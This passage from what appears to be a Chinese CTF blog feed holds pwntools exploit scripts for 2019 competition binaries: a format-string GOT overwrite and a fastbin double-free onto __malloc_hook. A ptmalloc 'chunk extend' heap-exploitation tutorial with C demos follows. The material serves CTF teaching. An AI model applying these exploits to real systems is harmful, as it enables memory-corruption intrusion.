class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 2</span>addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 3</span>addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"bbbbbbbb"</span>) <span class="hljs-comment"># 4</span>delnote(<span class="hljs-number">3</span>)delnote(<span class="hljs-number">4</span>)delnote(<span class="hljs-number">3</span>)addnote(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))p.sendlineafter(<span class="hljs-string">"Your choice :"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"Note size :"</span>,str(<span class="hljs-number">10</span>))<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h1 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h1><h2 id="integer-seq">integer_seq<a class="post-anchor" href="#integer-seq"></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>山东深思杯write up</title>
      <link href="/2019/11/03/%E5%B1%B1%E4%B8%9C%E6%B7%B1%E6%80%9D%E6%9D%AFwrite-up/"/>
      <url>/2019/11/03/%E5%B1%B1%E4%B8%9C%E6%B7%B1%E6%80%9D%E6%9D%AFwrite-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="FuQiang">FuQiang<a class="post-anchor" href="#FuQiang"></a></h2><p>程序</p><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="pwn1">pwn1<a class="post-anchor" href="#pwn1"></a></h2><p>题目给了一个backdoor ，满足约束条件即可</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level=<span class="hljs-string">'debug'</span>p = process(<span class="hljs-string">"./pwn_MinZhu"</span>)<span class="hljs-comment">#p =remote("172.29.1.38", 9999)</span>elf = ELF(<span class="hljs-string">"./pwn_MinZhu"</span>)system = <span class="hljs-number">0x08048696</span>plt = elf.got[<span class="hljs-string">'puts'</span>]p.sendlineafter(<span class="hljs-string">"Key:"</span>,<span class="hljs-string">"xNd9y6"</span>)offset = <span class="hljs-number">4</span>p.recvuntil(<span class="hljs-string">"your msg:"</span>)payload=fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A064</span>:<span class="hljs-number">0x3</span>&#125;)p.sendline(payload)payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A060</span>:<span class="hljs-number">8217</span>&#125;)p.sendline(payload)payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;plt:<span class="hljs-number">0x8048696</span>&#125;)p.sendline(payload)<span class="hljs-string">'''SHBYTE = 57 9SHBYTE1 = 78 NSHBYTE2 = 100 dCHAR S = 120 xv4 =6v3 = yxNd9y6'''</span>p.interactive()</code></pre><h2 id="pwn2">pwn2<a class="post-anchor" href="#pwn2"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level='debug'</span>context.terminal=[<span class="hljs-string">"tmux"</span>,<span class="hljs-string">"split"</span>,<span class="hljs-string">"-h"</span>]p = process(<span class="hljs-string">"./pwn"</span>)libc = ELF(<span class="hljs-string">"./libc.so"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(size))p.sendlineafter(<span class="hljs-string">"Leave your message:\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">3</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))p.sendlineafter(<span class="hljs-string">"Enter what you want to modify:\n"</span>,content)add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#2</span>delete(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">"aaaaaaa"</span>) <span class="hljs-comment">#3</span>show()p.recvuntil(<span class="hljs-string">"Sticky note:aaaaaaa\n"</span>)libc_base = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-0x3c4b78</span>log.success(<span class="hljs-string">"libc_base : 0x%x"</span>%libc_base)malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)delete(<span class="hljs-number">4</span>)delete(<span class="hljs-number">5</span>)delete(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(<span class="hljs-number">127</span>))<span class="hljs-comment">#gdb.attach(p)</span>p.interactive()</code></pre><h2 id="pwn3">pwn3<a class="post-anchor" href="#pwn3"></a></h2><p>利用 malloc_consolidate 去完成 chunk 的重叠，从而实现leak libc跟 tcache 的uaf（通过刻意的让 unsorted chunk 的size变小，可以让 unsorted chunk 的下一个chunk的prev_size 不变，从而可以 pass malloc_consolidate 时的 unlink 检测，从而实现chunk的重</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunk extend</title>
      <link href="/2019/10/21/chunk-extend/"/>
      <url>/2019/10/21/chunk-extend/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍<a class="post-anchor" href="#介绍"></a></h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理">原理<a class="post-anchor" href="#原理"></a></h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小操作如下</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></code></pre><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></code></pre><p>即使用当前块指针加上当前块大小。</p><p>在 ptmalloc 中，获取前一个chunk 信息的操作如下</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></code></pre><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，判断当前 chunk 是否 use 状态的操作如下：</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</code></pre><p>即查看下一个 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前chunk size 计算得出</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 prev_size 域来实现跨越块操作从而导致 overlapping的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p><h2 id="基本示例1：对-inuse-的fastbin-进行extend">基本示例1：对 inuse 的fastbin 进行extend<a class="post-anchor" href="#基本示例1：对-inuse-的fastbin-进行extend"></a></h2><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。<strong>注意，我们的示例都是在 64 位的程序。如果想在32位下进行测试，可以把 8 字节偏移改为 4 字节。</strong></p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第一个0x10的chunk</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk</span>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<span class="hljs-comment">// 修改第一个块的size域</span>    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">// 实现 extend，控制了第二个块的内容</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>当两个 malloc 语句执行之后，堆的内存分布如下</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <span class="hljs-number">1</span><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <span class="hljs-number">2</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fc1</span> &lt;=== top chunk</code></pre><p>之后，我们会把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40.在题目中这一步可以由堆溢出得到。</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== 篡改大小<span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fc1</span></code></pre><p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p><pre><code class="hljs assembly">Fastbins[idx=0, size=0x10] 0x00Fastbins[idx=1, size=0x20] 0x00Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE)Fastbins[idx=3, size=0x40] 0x00Fastbins[idx=4, size=0x50] 0x00Fastbins[idx=5, size=0x60] 0x00Fastbins[idx=6, size=0x70] 0x00</code></pre><p>之后我们通过 malloc(0x30) 得到 chunk1 + chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p><pre><code class="hljs assembly">call   0x400450 &lt;malloc@plt&gt;mov    QWORD PTR [rbp-0x8], raxrax = 0x602010</code></pre><h2 id="基本示例2：对-inuse-的-smallbin-进行-extend">基本示例2：对 inuse 的 smallbin 进行 extend<a class="post-anchor" href="#基本示例2：对-inuse-的-smallbin-进行-extend"></a></h2><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被植入 fastbin 链表中。以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用的范围是 0x70）</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个 0x80 的chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第二个 0x10 的chunk2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//防止与top chunk合并</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);&#125;</code></pre><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个chunk ，把释放的块与 top chunk 隔开。</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域0x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</code></pre><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x00000000000000210x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</code></pre><pre><code class="hljs assembly">[+] unsorted_bins[0]: fw=0x602000, bk=0x602000 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)</code></pre><p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p><pre><code class="hljs assembly">    0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;→   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax    rax : 0x0000000000602010</code></pre><h2 id="基本示例3：对-free-的-smallbin-进行-extend">基本示例3：对 free 的 smallbin 进行 extend<a class="post-anchor" href="#基本示例3：对-free-的-smallbin-进行-extend"></a></h2><p>示例3 是在示例2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 size 域。</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);&#125;</code></pre><p>两次 malloc 之后的结果如下</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51</code></pre><p>我们首先释放 chunk1 使他进入 unsorted bin 中</p><pre><code class="hljs assembly">     unsorted_bins[0]: fw=0x602000, bk=0x602000 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</code></pre><p>然后 篡改 chunk1 的 size 域</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x00000000000000b1</span> &lt;=== size域被篡改<span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x00007ffff7dd1b78</span>  <span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000000090</span>  <span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f51</span></code></pre><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="Chunk-Extend-Shrink-可以做什么">Chunk Extend/Shrink 可以做什么<a class="post-anchor" href="#Chunk-Extend-Shrink-可以做什么"></a></h2><p> 一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄露和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping ，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="基本示例4：通过-extend-后向-overlapping">基本示例4：通过 extend 后向 overlapping<a class="post-anchor" href="#基本示例4：通过-extend-后向-overlapping"></a></h2><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其他的一些利用。</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第1个 0x80 的chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第2个 0x10 的chunk2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第3个 0x10 的chunk3</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第4个 0x10 的chunk4    </span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);&#125;</code></pre><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="基本示例5：通过extend-前向-overlapping">基本示例5：通过extend 前向 overlapping<a class="post-anchor" href="#基本示例5：通过extend-前向-overlapping"></a></h2><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块。</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin1</span>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin1</span>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin2</span>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//防止与top合并</span>    <span class="hljs-built_in">free</span>(ptr1);    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;<span class="hljs-comment">//修改pre_inuse域</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;<span class="hljs-comment">//修改pre_size域</span>    <span class="hljs-built_in">free</span>(ptr4);<span class="hljs-comment">//unlink进行前向extend</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);<span class="hljs-comment">//占位块</span>&#125;</code></pre><p>前向 extend 利用了 small bin 的 unlink 机制，通过修改 pre_size 域可以跨越多个chunk 进行合并实现 overlapping。</p><h2 id="HITCON-Training-lab-13">HITCON Training lab 13<a class="post-anchor" href="#HITCON-Training-lab-13"></a></h2><p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。</p><p><strong>程序逻辑</strong></p><pre><code class="hljs bash">--------------------------------          Heap Creator          -------------------------------- 1. Create a Heap                2. Edit a Heap                  3. Show a Heap                  4. Delete a Heap                5. Exit                        --------------------------------</code></pre><p><strong>创建堆</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">create_heap</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span>  <span class="hljs-keyword">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )  &#123;    <span class="hljs-keyword">if</span> ( !heaparray[i] )    &#123;      heaparray[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-keyword">if</span> ( !heaparray[i] )      &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);      &#125;      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);      read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);      size = atoi(&amp;buf);      v0 = heaparray[i];      v0[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(size);      <span class="hljs-keyword">if</span> ( !*((_QWORD *)heaparray[i] + <span class="hljs-number">1</span>) )      &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);      &#125;      *(_QWORD *)heaparray[i] = size;      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>, &amp;buf);      read_input(*((_QWORD *)heaparray[i] + <span class="hljs-number">1</span>), size);      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;    &#125;  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;&#125;</code></pre><p><strong>编辑堆，比之前创建堆时的size多读入了一个字节，造成 off-by-one</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">edit_heap</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span>  <span 